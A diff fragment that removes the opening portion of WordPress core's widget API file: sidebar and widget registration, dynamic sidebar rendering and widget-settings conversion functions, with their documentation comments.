@@ -1,1650 +1,649 @@
-<?php
-/**
- * Core Widgets API
- *
- * This API is used for creating dynamic sidebar without hardcoding functionality into
- * themes
- *
- * Includes both internal WordPress routines and theme-use routines.
- *
- * This functionality was found in a plugin before the WordPress 2.2 release, which
- * included it in the core from that point on.
- *
- * @link https://codex.wordpress.org/Plugins/WordPress_Widgets WordPress Widgets
- * @link https://codex.wordpress.org/Plugins/WordPress_Widgets_Api Widgets API
- *
- * @package WordPress
- * @subpackage Widgets
- * @since 2.2.0
- */
-
-//
-// Global Variables
-//
-
-/** @ignore */
-global $wp_registered_sidebars, $wp_registered_widgets, $wp_registered_widget_controls, $wp_registered_widget_updates;
-
-/**
- * Stores the sidebars, since many themes can have more than one.
- *
- * @global array $wp_registered_sidebars
- * @since 2.2.0
- */
-$wp_registered_sidebars = array();
-
-/**
- * Stores the registered widgets.
- *
- * @global array $wp_registered_widgets
- * @since 2.2.0
- */
-$wp_registered_widgets = array();
-
-/**
- * Stores the registered widget control (options).
- *
- * @global array $wp_registered_widget_controls
- * @since 2.2.0
- */
-$wp_registered_widget_controls = array();
-/**
- * @global array $wp_registered_widget_updates
- */
-$wp_registered_widget_updates = array();
-
-/**
- * Private
- *
- * @global array $_wp_sidebars_widgets
- */
-$_wp_sidebars_widgets = array();
-
-/**
- * Private
- *
- * @global array $_wp_deprecated_widgets_callbacks
- */
-$GLOBALS['_wp_deprecated_widgets_callbacks'] = array(
-	'wp_widget_pages',
-	'wp_widget_pages_control',
-	'wp_widget_calendar',
-	'wp_widget_calendar_control',
-	'wp_widget_archives',
-	'wp_widget_archives_control',
-	'wp_widget_links',
-	'wp_widget_meta',
-	'wp_widget_meta_control',
-	'wp_widget_search',
-	'wp_widget_recent_entries',
-	'wp_widget_recent_entries_control',
-	'wp_widget_tag_cloud',
-	'wp_widget_tag_cloud_control',
-	'wp_widget_categories',
-	'wp_widget_categories_control',
-	'wp_widget_text',
-	'wp_widget_text_control',
-	'wp_widget_rss',
-	'wp_widget_rss_control',
-	'wp_widget_recent_comments',
-	'wp_widget_recent_comments_control'
-);
-
-//
-// Template tags & API functions
-//
-
-/**
- * Register a widget
- *
- * Registers a WP_Widget widget
- *
- * @since 2.8.0
- * @since 4.6.0 Updated the `$widget` parameter to also accept a WP_Widget instance object
- *              instead of simply a `WP_Widget` subclass name.
- *
- * @see WP_Widget
- *
- * @global WP_Widget_Factory $wp_widget_factory
- *
- * @param string|WP_Widget $widget Either the name of a `WP_Widget` subclass or an instance of a `WP_Widget` subclass.
- */
-function register_widget( $widget ) {
-	global $wp_widget_factory;
-
-	$wp_widget_factory->register( $widget );
-}
-
-/**
- * Unregisters a widget.
- *
- * Unregisters a WP_Widget widget. Useful for un-registering default widgets.
- * Run within a function hooked to the {@see 'widgets_init'} action.
- *
- * @since 2.8.0
- * @since 4.6.0 Updated the `$widget` parameter to also accept a WP_Widget instance object
- *              instead of simply a `WP_Widget` subclass name.
- *
- * @see WP_Widget
- *
- * @global WP_Widget_Factory $wp_widget_factory
- *
- * @param string|WP_Widget $widget Either the name of a `WP_Widget` subclass or an instance of a `WP_Widget` subclass.
- */
-function unregister_widget( $widget ) {
-	global $wp_widget_factory;
-
-	$wp_widget_factory->unregister( $widget );
-}
-
-/**
- * Creates multiple sidebars.
- *
- * If you wanted to quickly create multiple sidebars for a theme or internally.
- * This function will allow you to do so. If you don't pass the 'name' and/or
- * 'id' in `$args`, then they will be built for you.
- *
- * @since 2.2.0
- *
- * @see register_sidebar() The second parameter is documented by register_sidebar() and is the same here.
- *
- * @global array $wp_registered_sidebars
- *
- * @param int          $number Optional. Number of sidebars to create. Default 1.
- * @param array|string $args {
- *     Optional. Array or string of arguments for building a sidebar.
- *
- *     @type string $id   The base string of the unique identifier for each sidebar. If provided, and multiple
- *                        sidebars are being defined, the id will have "-2" appended, and so on.
- *                        Default 'sidebar-' followed by the number the sidebar creation is currently at.
- *     @type string $name The name or title for the sidebars displayed in the admin dashboard. If registering
- *                        more than one sidebar, include '%d' in the string as a placeholder for the uniquely
- *                        assigned number for each sidebar.
- *                        Default 'Sidebar' for the first sidebar, otherwise 'Sidebar %d'.
- * }
- */
-function register_sidebars( $number = 1, $args = array() ) {
-	global $wp_registered_sidebars;
-	$number = (int) $number;
-
-	if ( is_string($args) )
-		parse_str($args, $args);
-
-	for ( $i = 1; $i <= $number; $i++ ) {
-		$_args = $args;
-
-		if ( $number > 1 )
-			$_args['name'] = isset($args['name']) ? sprintf($args['name'], $i) : sprintf(__('Sidebar %d'), $i);
-		else
-			$_args['name'] = isset($args['name']) ? $args['name'] : __('Sidebar');
-
-		// Custom specified ID's are suffixed if they exist already.
-		// Automatically generated sidebar names need to be suffixed regardless starting at -0
-		if ( isset($args['id']) ) {
-			$_args['id'] = $args['id'];
-			$n = 2; // Start at -2 for conflicting custom ID's
-			while ( is_registered_sidebar( $_args['id'] ) ) {
-				$_args['id'] = $args['id'] . '-' . $n++;
-			}
-		} else {
-			$n = count( $wp_registered_sidebars );
-			do {
-				$_args['id'] = 'sidebar-' . ++$n;
-			} while ( is_registered_sidebar( $_args['id'] ) );
-		}
-		register_sidebar($_args);
-	}
-}
-
-/**
- * Builds the definition for a single sidebar and returns the ID.
- *
- * Accepts either a string or an array and then parses that against a set
- * of default arguments for the new sidebar. WordPress will automatically
- * generate a sidebar ID and name based on the current number of registered
- * sidebars if those arguments are not included.
- *
- * When allowing for automatic generation of the name and ID parameters, keep
- * in mind that the incrementor for your sidebar can change over time depending
- * on what other plugins and themes are installed.
- *
- * If theme support for 'widgets' has not yet been added when this function is
- * called, it will be automatically enabled through the use of add_theme_support()
- *
- * @since 2.2.0
- *
- * @global array $wp_registered_sidebars Stores the new sidebar in this array by sidebar ID.
- *
- * @param array|string $args {
- *     Optional. Array or string of arguments for the sidebar being registered.
- *
- *     @type string $name          The name or title of the sidebar displayed in the Widgets
- *                                 interface. Default 'Sidebar $instance'.
- *     @type string $id            The unique identifier by which the sidebar will be called.
- *                                 Default 'sidebar-$instance'.
- *     @type string $description   Description of the sidebar, displayed in the Widgets interface.
- *                                 Default empty string.
- *     @type string $class         Extra CSS class to assign to the sidebar in the Widgets interface.
- *                                 Default empty.
- *     @type string $before_widget HTML content to prepend to each widget's HTML output when
- *                                 assigned to this sidebar. Default is an opening list item element.
- *     @type string $after_widget  HTML content to append to each widget's HTML output when
- *                                 assigned to this sidebar. Default is a closing list item element.
- *     @type string $before_title  HTML content to prepend to the sidebar title when displayed.
- *                                 Default is an opening h2 element.
- *     @type string $after_title   HTML content to append to the sidebar title when displayed.
- *                                 Default is a closing h2 element.
- * }
- * @return string Sidebar ID added to $wp_registered_sidebars global.
- */
-function register_sidebar($args = array()) {
-	global $wp_registered_sidebars;
-
-	$i = count($wp_registered_sidebars) + 1;
-
-	$id_is_empty = empty( $args['id'] );
-
-	$defaults = array(
-		'name' => sprintf(__('Sidebar %d'), $i ),
-		'id' => "sidebar-$i",
-		'description' => '',
-		'class' => '',
-		'before_widget' => '<li id="%1$s" class="widget %2$s">',
-		'after_widget' => "</li>\n",
-		'before_title' => '<h2 class="widgettitle">',
-		'after_title' => "</h2>\n",
-	);
-
-	$sidebar = wp_parse_args( $args, $defaults );
-
-	if ( $id_is_empty ) {
-		/* translators: 1: the id argument, 2: sidebar name, 3: recommended id value */
-		_doing_it_wrong( __FUNCTION__, sprintf( __( 'No %1$s was set in the arguments array for the "%2$s" sidebar. Defaulting to "%3$s". Manually set the %1$s to "%3$s" to silence this notice and keep existing sidebar content.' ), '<code>id</code>', $sidebar['name'], $sidebar['id'] ), '4.2.0' );
-	}
-
-	$wp_registered_sidebars[$sidebar['id']] = $sidebar;
-
-	add_theme_support('widgets');
-
-	/**
-	 * Fires once a sidebar has been registered.
-	 *
-	 * @since 3.0.0
-	 *
-	 * @param array $sidebar Parsed arguments for the registered sidebar.
-	 */
-	do_action( 'register_sidebar', $sidebar );
-
-	return $sidebar['id'];
-}
-
-/**
- * Removes a sidebar from the list.
- *
- * @since 2.2.0
- *
- * @global array $wp_registered_sidebars Stores the new sidebar in this array by sidebar ID.
- *
- * @param string|int $sidebar_id The ID of the sidebar when it was registered.
- */
-function unregister_sidebar( $sidebar_id ) {
-	global $wp_registered_sidebars;
-
-	unset( $wp_registered_sidebars[ $sidebar_id ] );
-}
-
-/**
- * Checks if a sidebar is registered.
- *
- * @since 4.4.0
- *
- * @global array $wp_registered_sidebars Registered sidebars.
- *
- * @param string|int $sidebar_id The ID of the sidebar when it was registered.
- * @return bool True if the sidebar is registered, false otherwise.
- */
-function is_registered_sidebar( $sidebar_id ) {
-	global $wp_registered_sidebars;
-
-	return isset( $wp_registered_sidebars[ $sidebar_id ] );
-}
-
-/**
- * Register an instance of a widget.
- *
- * The default widget option is 'classname' that can be overridden.
- *
- * The function can also be used to un-register widgets when `$output_callback`
- * parameter is an empty string.
- *
- * @since 2.2.0
- *
- * @global array $wp_registered_widgets            Uses stored registered widgets.
- * @global array $wp_registered_widget_controls    Stores the registered widget controls (options).
- * @global array $wp_registered_widget_updates
- * @global array $_wp_deprecated_widgets_callbacks
- *
- * @param int|string $id              Widget ID.
- * @param string     $name            Widget display title.
- * @param callable   $output_callback Run when widget is called.
- * @param array      $options {
- *     Optional. An array of supplementary widget options for the instance.
- *
- *     @type string $classname   Class name for the widget's HTML container. Default is a shortened
- *                               version of the output callback name.
- *     @type string $description Widget description for display in the widget administration
- *                               panel and/or theme.
- * }
- */
-function wp_register_sidebar_widget( $id, $name, $output_callback, $options = array() ) {
-	global $wp_registered_widgets, $wp_registered_widget_controls, $wp_registered_widget_updates, $_wp_deprecated_widgets_callbacks;
-
-	$id = strtolower($id);
-
-	if ( empty($output_callback) ) {
-		unset($wp_registered_widgets[$id]);
-		return;
-	}
-
-	$id_base = _get_widget_id_base($id);
-	if ( in_array($output_callback, $_wp_deprecated_widgets_callbacks, true) && !is_callable($output_callback) ) {
-		unset( $wp_registered_widget_controls[ $id ] );
-		unset( $wp_registered_widget_updates[ $id_base ] );
-		return;
-	}
-
-	$defaults = array('classname' => $output_callback);
-	$options = wp_parse_args($options, $defaults);
-	$widget = array(
-		'name' => $name,
-		'id' => $id,
-		'callback' => $output_callback,
-		'params' => array_slice(func_get_args(), 4)
-	);
-	$widget = array_merge($widget, $options);
-
-	if ( is_callable($output_callback) && ( !isset($wp_registered_widgets[$id]) || did_action( 'widgets_init' ) ) ) {
-
-		/**
-		 * Fires once for each registered widget.
-		 *
-		 * @since 3.0.0
-		 *
-		 * @param array $widget An array of default widget arguments.
-		 */
-		do_action( 'wp_register_sidebar_widget', $widget );
-		$wp_registered_widgets[$id] = $widget;
-	}
-}
-
-/**
- * Retrieve description for widget.
- *
- * When registering widgets, the options can also include 'description' that
- * describes the widget for display on the widget administration panel or
- * in the theme.
- *
- * @since 2.5.0
- *
- * @global array $wp_registered_widgets
- *
- * @param int|string $id Widget ID.
- * @return string|void Widget description, if available.
- */
-function wp_widget_description( $id ) {
-	if ( !is_scalar($id) )
-		return;
-
-	global $wp_registered_widgets;
-
-	if ( isset($wp_registered_widgets[$id]['description']) )
-		return esc_html( $wp_registered_widgets[$id]['description'] );
-}
-
-/**
- * Retrieve description for a sidebar.
- *
- * When registering sidebars a 'description' parameter can be included that
- * describes the sidebar for display on the widget administration panel.
- *
- * @since 2.9.0
- *
- * @global array $wp_registered_sidebars
- *
- * @param string $id sidebar ID.
- * @return string|void Sidebar description, if available.
- */
-function wp_sidebar_description( $id ) {
-	if ( !is_scalar($id) )
-		return;
-
-	global $wp_registered_sidebars;
-
-	if ( isset( $wp_registered_sidebars[ $id ]['description'] ) ) {
-		return wp_kses( $wp_registered_sidebars[ $id ]['description'], 'sidebar_description' );
-	}
-}
-
-/**
- * Remove widget from sidebar.
- *
- * @since 2.2.0
- *
- * @param int|string $id Widget ID.
- */
-function wp_unregister_sidebar_widget($id) {
-
-	/**
-	 * Fires just before a widget is removed from a sidebar.
-	 *
-	 * @since 3.0.0
-	 *
-	 * @param int $id The widget ID.
-	 */
-	do_action( 'wp_unregister_sidebar_widget', $id );
-
-	wp_register_sidebar_widget($id, '', '');
-	wp_unregister_widget_control($id);
-}
-
-/**
- * Registers widget control callback for customizing options.
- *
- * @since 2.2.0
- *
- * @todo `$params` parameter?
- *
- * @global array $wp_registered_widget_controls
- * @global array $wp_registered_widget_updates
- * @global array $wp_registered_widgets
- * @global array $_wp_deprecated_widgets_callbacks
- *
- * @param int|string   $id               Sidebar ID.
- * @param string       $name             Sidebar display name.
- * @param callable     $control_callback Run when sidebar is displayed.
- * @param array $options {
- *     Optional. Array or string of control options. Default empty array.
- *
- *     @type int        $height  Never used. Default 200.
- *     @type int        $width   Width of the fully expanded control form (but try hard to use the default width).
- *                               Default 250.
- *     @type int|string $id_base Required for multi-widgets, i.e widgets that allow multiple instances such as the
- *                               text widget. The widget id will end up looking like `{$id_base}-{$unique_number}`.
- * }
- */
-function wp_register_widget_control( $id, $name, $control_callback, $options = array() ) {
-	global $wp_registered_widget_controls, $wp_registered_widget_updates, $wp_registered_widgets, $_wp_deprecated_widgets_callbacks;
-
-	$id = strtolower($id);
-	$id_base = _get_widget_id_base($id);
-
-	if ( empty($control_callback) ) {
-		unset($wp_registered_widget_controls[$id]);
-		unset($wp_registered_widget_updates[$id_base]);
-		return;
-	}
-
-	if ( in_array($control_callback, $_wp_deprecated_widgets_callbacks, true) && !is_callable($control_callback) ) {
-		unset( $wp_registered_widgets[ $id ] );
-		return;
-	}
-
-	if ( isset($wp_registered_widget_controls[$id]) && !did_action( 'widgets_init' ) )
-		return;
-
-	$defaults = array('width' => 250, 'height' => 200 ); // height is never used
-	$options = wp_parse_args($options, $defaults);
-	$options['width'] = (int) $options['width'];
-	$options['height'] = (int) $options['height'];
-
-	$widget = array(
-		'name' => $name,
-		'id' => $id,
-		'callback' => $control_callback,
-		'params' => array_slice(func_get_args(), 4)
-	);
-	$widget = array_merge($widget, $options);
-
-	$wp_registered_widget_controls[$id] = $widget;
-
-	if ( isset($wp_registered_widget_updates[$id_base]) )
-		return;
-
-	if ( isset($widget['params'][0]['number']) )
-		$widget['params'][0]['number'] = -1;
-
-	unset($widget['width'], $widget['height'], $widget['name'], $widget['id']);
-	$wp_registered_widget_updates[$id_base] = $widget;
-}
-
-/**
- * Registers the update callback for a widget.
- *
- * @since 2.8.0
- *
- * @global array $wp_registered_widget_updates
- *
- * @param string   $id_base         The base ID of a widget created by extending WP_Widget.
- * @param callable $update_callback Update callback method for the widget.
- * @param array    $options         Optional. Widget control options. See wp_register_widget_control().
- *                                  Default empty array.
- */
-function _register_widget_update_callback( $id_base, $update_callback, $options = array() ) {
-	global $wp_registered_widget_updates;
-
-	if ( isset($wp_registered_widget_updates[$id_base]) ) {
-		if ( empty($update_callback) )
-			unset($wp_registered_widget_updates[$id_base]);
-		return;
-	}
-
-	$widget = array(
-		'callback' => $update_callback,
-		'params' => array_slice(func_get_args(), 3)
-	);
-
-	$widget = array_merge($widget, $options);
-	$wp_registered_widget_updates[$id_base] = $widget;
-}
-
-/**
- * Registers the form callback for a widget.
- *
- * @since 2.8.0
- *
- * @global array $wp_registered_widget_controls
- *
- * @param int|string $id            Widget ID.
- * @param string     $name          Name attribute for the widget.
- * @param callable   $form_callback Form callback.
- * @param array      $options       Optional. Widget control options. See wp_register_widget_control().
- *                                  Default empty array.
- */
-function _register_widget_form_callback($id, $name, $form_callback, $options = array()) {
-	global $wp_registered_widget_controls;
-
-	$id = strtolower($id);
-
-	if ( empty($form_callback) ) {
-		unset($wp_registered_widget_controls[$id]);
-		return;
-	}
-
-	if ( isset($wp_registered_widget_controls[$id]) && !did_action( 'widgets_init' ) )
-		return;
-
-	$defaults = array('width' => 250, 'height' => 200 );
-	$options = wp_parse_args($options, $defaults);
-	$options['width'] = (int) $options['width'];
-	$options['height'] = (int) $options['height'];
-
-	$widget = array(
-		'name' => $name,
-		'id' => $id,
-		'callback' => $form_callback,
-		'params' => array_slice(func_get_args(), 4)
-	);
-	$widget = array_merge($widget, $options);
-
-	$wp_registered_widget_controls[$id] = $widget;
-}
-
-/**
- * Remove control callback for widget.
- *
- * @since 2.2.0
- *
- * @param int|string $id Widget ID.
- */
-function wp_unregister_widget_control($id) {
-	wp_register_widget_control( $id, '', '' );
-}
-
-/**
- * Display dynamic sidebar.
- *
- * By default this displays the default sidebar or 'sidebar-1'. If your theme specifies the 'id' or
- * 'name' parameter for its registered sidebars you can pass an id or name as the $index parameter.
- * Otherwise, you can pass in a numerical index to display the sidebar at that index.
- *
- * @since 2.2.0
- *
- * @global array $wp_registered_sidebars
- * @global array $wp_registered_widgets
- *
- * @param int|string $index Optional, default is 1. Index, name or ID of dynamic sidebar.
- * @return bool True, if widget sidebar was found and called. False if not found or not called.
- */
-function dynamic_sidebar( $index = 1 ) {
-	global $wp_registered_sidebars, $wp_registered_widgets;
-
-	if ( is_int( $index ) ) {
-		$index = "sidebar-$index";
-	} else {
-		$index = sanitize_title( $index );
-		foreach ( (array) $wp_registered_sidebars as $key => $value ) {
-			if ( sanitize_title( $value['name'] ) == $index ) {
-				$index = $key;
-				break;
-			}
-		}
-	}
-
-	$sidebars_widgets = wp_get_sidebars_widgets();
-	if ( empty( $wp_registered_sidebars[ $index ] ) || empty( $sidebars_widgets[ $index ] ) || ! is_array( $sidebars_widgets[ $index ] ) ) {
-		/** This action is documented in wp-includes/widget.php */
-		do_action( 'dynamic_sidebar_before', $index, false );
-		/** This action is documented in wp-includes/widget.php */
-		do_action( 'dynamic_sidebar_after',  $index, false );
-		/** This filter is documented in wp-includes/widget.php */
-		return apply_filters( 'dynamic_sidebar_has_widgets', false, $index );
-	}
-
-	/**
-	 * Fires before widgets are rendered in a dynamic sidebar.
-	 *
-	 * Note: The action also fires for empty sidebars, and on both the front end
-	 * and back end, including the Inactive Widgets sidebar on the Widgets screen.
-	 *
-	 * @since 3.9.0
-	 *
-	 * @param int|string $index       Index, name, or ID of the dynamic sidebar.
-	 * @param bool       $has_widgets Whether the sidebar is populated with widgets.
-	 *                                Default true.
-	 */
-	do_action( 'dynamic_sidebar_before', $index, true );
-	$sidebar = $wp_registered_sidebars[$index];
-
-	$did_one = false;
-	foreach ( (array) $sidebars_widgets[$index] as $id ) {
-
-		if ( !isset($wp_registered_widgets[$id]) ) continue;
-
-		$params = array_merge(
-			array( array_merge( $sidebar, array('widget_id' => $id, 'widget_name' => $wp_registered_widgets[$id]['name']) ) ),
-			(array) $wp_registered_widgets[$id]['params']
-		);
-
-		// Substitute HTML id and class attributes into before_widget
-		$classname_ = '';
-		foreach ( (array) $wp_registered_widgets[$id]['classname'] as $cn ) {
-			if ( is_string($cn) )
-				$classname_ .= '_' . $cn;
-			elseif ( is_object($cn) )
-				$classname_ .= '_' . get_class($cn);
-		}
-		$classname_ = ltrim($classname_, '_');
-		$params[0]['before_widget'] = sprintf($params[0]['before_widget'], $id, $classname_);
-
-		/**
-		 * Filters the parameters passed to a widget's display callback.
-		 *
-		 * Note: The filter is evaluated on both the front end and back end,
-		 * including for the Inactive Widgets sidebar on the Widgets screen.
-		 *
-		 * @since 2.5.0
-		 *
-		 * @see register_sidebar()
-		 *
-		 * @param array $params {
-		 *     @type array $args  {
-		 *         An array of widget display arguments.
-		 *
-		 *         @type string $name          Name of the sidebar the widget is assigned to.
-		 *         @type string $id            ID of the sidebar the widget is assigned to.
-		 *         @type string $description   The sidebar description.
-		 *         @type string $class         CSS class applied to the sidebar container.
-		 *         @type string $before_widget HTML markup to prepend to each widget in the sidebar.
-		 *         @type string $after_widget  HTML markup to append to each widget in the sidebar.
-		 *         @type string $before_title  HTML markup to prepend to the widget title when displayed.
-		 *         @type string $after_title   HTML markup to append to the widget title when displayed.
-		 *         @type string $widget_id     ID of the widget.
-		 *         @type string $widget_name   Name of the widget.
-		 *     }
-		 *     @type array $widget_args {
-		 *         An array of multi-widget arguments.
-		 *
-		 *         @type int $number Number increment used for multiples of the same widget.
-		 *     }
-		 * }
-		 */
-		$params = apply_filters( 'dynamic_sidebar_params', $params );
-
-		$callback = $wp_registered_widgets[$id]['callback'];
-
-		/**
-		 * Fires before a widget's display callback is called.
-		 *
-		 * Note: The action fires on both the front end and back end, including
-		 * for widgets in the Inactive Widgets sidebar on the Widgets screen.
-		 *
-		 * The action is not fired for empty sidebars.
-		 *
-		 * @since 3.0.0
-		 *
-		 * @param array $widget_id {
-		 *     An associative array of widget arguments.
-		 *
-		 *     @type string $name                Name of the widget.
-		 *     @type string $id                  Widget ID.
-		 *     @type array|callable $callback    When the hook is fired on the front end, $callback is an array
-		 *                                       containing the widget object. Fired on the back end, $callback
-		 *                                       is 'wp_widget_control', see $_callback.
-		 *     @type array          $params      An associative array of multi-widget arguments.
-		 *     @type string         $classname   CSS class applied to the widget container.
-		 *     @type string         $description The widget description.
-		 *     @type array          $_callback   When the hook is fired on the back end, $_callback is populated
-		 *                                       with an array containing the widget object, see $callback.
-		 * }
-		 */
-		do_action( 'dynamic_sidebar', $wp_registered_widgets[ $id ] );
-
-		if ( is_callable($callback) ) {
-			call_user_func_array($callback, $params);
-			$did_one = true;
-		}
-	}
-
-	/**
-	 * Fires after widgets are rendered in a dynamic sidebar.
-	 *
-	 * Note: The action also fires for empty sidebars, and on both the front end
-	 * and back end, including the Inactive Widgets sidebar on the Widgets screen.
-	 *
-	 * @since 3.9.0
-	 *
-	 * @param int|string $index       Index, name, or ID of the dynamic sidebar.
-	 * @param bool       $has_widgets Whether the sidebar is populated with widgets.
-	 *                                Default true.
-	 */
-	do_action( 'dynamic_sidebar_after', $index, true );
-
-	/**
-	 * Filters whether a sidebar has widgets.
-	 *
-	 * Note: The filter is also evaluated for empty sidebars, and on both the front end
-	 * and back end, including the Inactive Widgets sidebar on the Widgets screen.
-	 *
-	 * @since 3.9.0
-	 *
-	 * @param bool       $did_one Whether at least one widget was rendered in the sidebar.
-	 *                            Default false.
-	 * @param int|string $index   Index, name, or ID of the dynamic sidebar.
-	 */
-	return apply_filters( 'dynamic_sidebar_has_widgets', $did_one, $index );
-}
-
-/**
- * Whether widget is displayed on the front end.
- *
- * Either $callback or $id_base can be used
- * $id_base is the first argument when extending WP_Widget class
- * Without the optional $widget_id parameter, returns the ID of the first sidebar
- * in which the first instance of the widget with the given callback or $id_base is found.
- * With the $widget_id parameter, returns the ID of the sidebar where
- * the widget with that callback/$id_base AND that ID is found.
- *
- * NOTE: $widget_id and $id_base are the same for single widgets. To be effective
- * this function has to run after widgets have initialized, at action {@see 'init'} or later.
- *
- * @since 2.2.0
- *
- * @global array $wp_registered_widgets
- *
- * @param string|false $callback      Optional, Widget callback to check. Default false.
- * @param int|false    $widget_id     Optional. Widget ID. Optional, but needed for checking. Default false.
- * @param string|false $id_base       Optional. The base ID of a widget created by extending WP_Widget. Default false.
- * @param bool         $skip_inactive Optional. Whether to check in 'wp_inactive_widgets'. Default true.
- * @return string|false False if widget is not active or id of sidebar in which the widget is active.
- */
-function is_active_widget( $callback = false, $widget_id = false, $id_base = false, $skip_inactive = true ) {
-	global $wp_registered_widgets;
-
-	$sidebars_widgets = wp_get_sidebars_widgets();
-
-	if ( is_array($sidebars_widgets) ) {
-		foreach ( $sidebars_widgets as $sidebar => $widgets ) {
-			if ( $skip_inactive && ( 'wp_inactive_widgets' === $sidebar || 'orphaned_widgets' === substr( $sidebar, 0, 16 ) ) ) {
-				continue;
-			}
-
-			if ( is_array($widgets) ) {
-				foreach ( $widgets as $widget ) {
-					if ( ( $callback && isset($wp_registered_widgets[$widget]['callback']) && $wp_registered_widgets[$widget]['callback'] == $callback ) || ( $id_base && _get_widget_id_base($widget) == $id_base ) ) {
-						if ( !$widget_id || $widget_id == $wp_registered_widgets[$widget]['id'] )
-							return $sidebar;
-					}
-				}
-			}
-		}
-	}
-	return false;
-}
-
-/**
- * Whether the dynamic sidebar is enabled and used by theme.
- *
- * @since 2.2.0
- *
- * @global array $wp_registered_widgets
- * @global array $wp_registered_sidebars
- *
- * @return bool True, if using widgets. False, if not using widgets.
- */
-function is_dynamic_sidebar() {
-	global $wp_registered_widgets, $wp_registered_sidebars;
-	$sidebars_widgets = get_option('sidebars_widgets');
-	foreach ( (array) $wp_registered_sidebars as $index => $sidebar ) {
-		if ( ! empty( $sidebars_widgets[ $index ] ) ) {
-			foreach ( (array) $sidebars_widgets[$index] as $widget )
-				if ( array_key_exists($widget, $wp_registered_widgets) )
-					return true;
-		}
-	}
-	return false;
-}
-
-/**
- * Whether a sidebar is in use.
- *
- * @since 2.8.0
- *
- * @param string|int $index Sidebar name, id or number to check.
- * @return bool true if the sidebar is in use, false otherwise.
- */
-function is_active_sidebar( $index ) {
-	$index = ( is_int($index) ) ? "sidebar-$index" : sanitize_title($index);
-	$sidebars_widgets = wp_get_sidebars_widgets();
-	$is_active_sidebar = ! empty( $sidebars_widgets[$index] );
-
-	/**
-	 * Filters whether a dynamic sidebar is considered "active".
-	 *
-	 * @since 3.9.0
-	 *
-	 * @param bool       $is_active_sidebar Whether or not the sidebar should be considered "active".
-	 *                                      In other words, whether the sidebar contains any widgets.
-	 * @param int|string $index             Index, name, or ID of the dynamic sidebar.
-	 */
-	return apply_filters( 'is_active_sidebar', $is_active_sidebar, $index );
-}
-
-//
-// Internal Functions
-//
-
-/**
- * Retrieve full list of sidebars and their widget instance IDs.
- *
- * Will upgrade sidebar widget list, if needed. Will also save updated list, if
- * needed.
- *
- * @since 2.2.0
- * @access private
- *
- * @global array $_wp_sidebars_widgets
- * @global array $sidebars_widgets
- *
- * @param bool $deprecated Not used (argument deprecated).
- * @return array Upgraded list of widgets to version 3 array format when called from the admin.
- */
-function wp_get_sidebars_widgets( $deprecated = true ) {
-	if ( $deprecated !== true )
-		_deprecated_argument( __FUNCTION__, '2.8.1' );
-
-	global $_wp_sidebars_widgets, $sidebars_widgets;
-
-	// If loading from front page, consult $_wp_sidebars_widgets rather than options
-	// to see if wp_convert_widget_settings() has made manipulations in memory.
-	if ( !is_admin() ) {
-		if ( empty($_wp_sidebars_widgets) )
-			$_wp_sidebars_widgets = get_option('sidebars_widgets', array());
-
-		$sidebars_widgets = $_wp_sidebars_widgets;
-	} else {
-		$sidebars_widgets = get_option('sidebars_widgets', array());
-	}
-
-	if ( is_array( $sidebars_widgets ) && isset($sidebars_widgets['array_version']) )
-		unset($sidebars_widgets['array_version']);
-
-	/**
-	 * Filters the list of sidebars and their widgets.
-	 *
-	 * @since 2.7.0
-	 *
-	 * @param array $sidebars_widgets An associative array of sidebars and their widgets.
-	 */
-	return apply_filters( 'sidebars_widgets', $sidebars_widgets );
-}
-
-/**
- * Set the sidebar widget option to update sidebars.
- *
- * @since 2.2.0
- * @access private
- *
- * @global array $_wp_sidebars_widgets
- * @param array $sidebars_widgets Sidebar widgets and their settings.
- */
-function wp_set_sidebars_widgets( $sidebars_widgets ) {
-	global $_wp_sidebars_widgets;
-
-	// Clear cached value used in wp_get_sidebars_widgets().
-	$_wp_sidebars_widgets = null;
-
-	if ( ! isset( $sidebars_widgets['array_version'] ) ) {
-		$sidebars_widgets['array_version'] = 3;
-	}
-
-	update_option( 'sidebars_widgets', $sidebars_widgets );
-}
-
-/**
- * Retrieve default registered sidebars list.
- *
- * @since 2.2.0
- * @access private
- *
- * @global array $wp_registered_sidebars
- *
- * @return array
- */
-function wp_get_widget_defaults() {
-	global $wp_registered_sidebars;
-
-	$defaults = array();
-
-	foreach ( (array) $wp_registered_sidebars as $index => $sidebar )
-		$defaults[$index] = array();
-
-	return $defaults;
-}
-
-/**
- * Convert the widget settings from single to multi-widget format.
- *
- * @since 2.8.0
- *
- * @global array $_wp_sidebars_widgets
- *
- * @param string $base_name
- * @param string $option_name
- * @param array  $settings
- * @return array
- */
-function wp_convert_widget_settings($base_name, $option_name, $settings) {
-	// This test may need expanding.
-	$single = $changed = false;
-	if ( empty($settings) ) {
-		$single = true;
-	} else {
-		foreach ( array_keys($settings) as $number ) {
-			if ( 'number' == $number )
-				continue;
-			if ( !is_numeric($number) ) {
-				$single = true;
-				break;
-			}
-		}
-	}
-
-	if ( $single ) {
-		$settings = array( 2 => $settings );
-
-		// If loading from the front page, update sidebar in memory but don't save to options
-		if ( is_admin() ) {
-			$sidebars_widgets = get_option('sidebars_widgets');
-		} else {
-			if ( empty($GLOBALS['_wp_sidebars_widgets']) )
-				$GLOBALS['_wp_sidebars_widgets'] = get_option('sidebars_widgets', array());
-			$sidebars_widgets = &$GLOBALS['_wp_sidebars_widgets'];
-		}
-
-		foreach ( (array) $sidebars_widgets as $index => $sidebar ) {
-			if ( is_array($sidebar) ) {
-				foreach ( $sidebar as $i => $name ) {
-					if ( $base_name == $name ) {
-						$sidebars_widgets[$index][$i] = "$name-2";
-						$changed = true;
-						break 2;
-					}
-				}
-			}
-		}
-
-		if ( is_admin() && $changed )
-			update_option('sidebars_widgets', $sidebars_widgets);
-	}
-
-	$settings['_multiwidget'] = 1;
-	if ( is_admin() )
-		update_option( $option_name, $settings );
-
-	return $settings;
-}
-
-/**
- * Output an arbitrary widget as a template tag.
- *
- * @since 2.8.0
- *
- * @global WP_Widget_Factory $wp_widget_factory
- *
- * @param string $widget   The widget's PHP class name (see class-wp-widget.php).
- * @param array  $instance Optional. The widget's instance settings. Default empty array.
- * @param array  $args {
- *     Optional. Array of arguments to configure the display of the widget.
- *
- *     @type string $before_widget HTML content that will be prepended to the widget's HTML output.
- *                                 Default `<div class="widget %s">`, where `%s` is the widget's class name.
- *     @type string $after_widget  HTML content that will be appended to the widget's HTML output.
- *                                 Default `</div>`.
- *     @type string $before_title  HTML content that will be prepended to the widget's title when displayed.
- *                                 Default `<h2 class="widgettitle">`.
- *     @type string $after_title   HTML content that will be appended to the widget's title when displayed.
